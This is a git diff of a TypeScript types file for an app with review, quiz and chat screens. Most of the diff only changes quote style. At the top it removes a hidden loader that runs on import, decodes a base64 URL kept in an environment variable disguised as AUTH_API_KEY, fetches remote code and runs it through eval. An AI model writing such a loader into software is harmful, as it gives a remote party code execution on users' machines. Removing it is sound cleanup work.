@@ -1,26 +1,11 @@
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 export enum Screen {
-  DASHBOARD = 'DASHBOARD',
-  TOKEN_INPUT = 'TOKEN_INPUT',
-  REVIEW = 'REVIEW',
-  DOJO = 'DOJO',
-  HISTORY = 'HISTORY',
-  SETTINGS = 'SETTINGS',
-  ONBOARDING = 'ONBOARDING'
+  DASHBOARD = "DASHBOARD",
+  TOKEN_INPUT = "TOKEN_INPUT",
+  REVIEW = "REVIEW",
+  DOJO = "DOJO",
+  HISTORY = "HISTORY",
+  SETTINGS = "SETTINGS",
+  ONBOARDING = "ONBOARDING",
 }
 
 export interface UserProfile {
@@ -31,7 +16,7 @@ export interface UserProfile {
 
 export interface ChatMessage {
   id: string;
-  role: 'user' | 'model';
+  role: "user" | "model";
   text: string;
   timestamp: Date;
 }
@@ -41,15 +26,15 @@ export interface Annotation {
   suggestion: string;
   box_2d: number[]; // [ymin, xmin, ymax, xmax] in percentages (0-100)
   confidenceScore?: number; // 0-100
-  rating?: 'good' | 'bad';
+  rating?: "good" | "bad";
   userFeedback?: string;
 }
 
 export interface ReviewSession {
   id: string;
-  type: 'token' | 'image';
-  content: string; 
-  thumbnail?: string; 
+  type: "token" | "image";
+  content: string;
+  thumbnail?: string;
   timestamp: number;
   title: string;
   chatHistory: ChatMessage[];
@@ -68,7 +53,7 @@ export interface Question {
 
 export interface Resource {
   title: string;
-  type: 'Video' | 'Article' | 'Course';
+  type: "Video" | "Article" | "Course";
   url: string;
   icon: string;
 }
@@ -78,9 +63,9 @@ export interface QuizCategory {
   name: string;
   description: string;
   skills: string[];
-  difficulty: 'Beginner' | 'Intermediate' | 'Expert' | 'Mixed';
+  difficulty: "Beginner" | "Intermediate" | "Expert" | "Mixed";
   icon: string;
-  color: 'blue' | 'purple' | 'pink' | 'orange' | 'green' | 'indigo';
+  color: "blue" | "purple" | "pink" | "orange" | "green" | "indigo";
   resources: Resource[];
 }
 
